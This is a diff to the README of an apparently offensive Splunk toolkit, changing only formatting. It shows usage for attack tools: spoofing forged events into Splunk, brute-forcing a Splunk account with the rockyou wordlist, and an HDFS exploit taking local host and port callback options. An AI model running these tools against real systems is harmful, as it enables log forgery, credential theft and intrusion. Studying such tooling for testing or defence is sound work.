@@ -18,7 +18,7 @@ USAGE: ./spooforward.py [options]:
 
 Example:
 
-```bash
+```
 ▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main -t spoofedtype -s spoofedsource  -m "some event message"
 
@@ -38,7 +38,7 @@ root@postern ⌁ ./spooforward.py -c -d -r 127.0.0.1 -l spoofedaddr.net -i main 
 
 ## [splunk_brute.sh]
 
-```bash
+```
 ▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./splunk_brute.sh test_acc /usr/share/wordlists/rockyou.txt 127.0.0.1 8000
 
@@ -63,21 +63,29 @@ This exploit need to meet several requirements:
 
 Usage:
         case "${option}"
+	
         in
                 h) rhost=${OPTARG};; # Remote host
+		
                 p) rport=${OPTARG};; # Remote port
+		
                 l) lhost=${OPTARG};; # Local host
+		
                 s) lport=${OPTARG};; # Local port
+		
 		o) proto=${OPTARG};; # Protocol [http|https]
+		
 		m) marker=${OPTARG};;# Unique string to search for
-  	u) uname=${OPTARG};; # Splunk user
+		
+  	        u) uname=${OPTARG};; # Splunk user
+		
 		w) passw=${OPTARG};; # Splunk password
- 	  c) scanhost="-c";;   # Scan host for spoofing capabilities
+		
+ 	        c) scanhost="-c";;   # Scan host for spoofing capabilities
+		
 		e) spoof="NO";;      # Dont try to spoof event (already there)
 
-
-
-```bash
+```
 ▶ ~/DEV/splunk_tools ◀
 root@postern ⌁ ./hdfs_exploit.sh -c -h 127.0.0.1 -m w00tw00tw00t
 
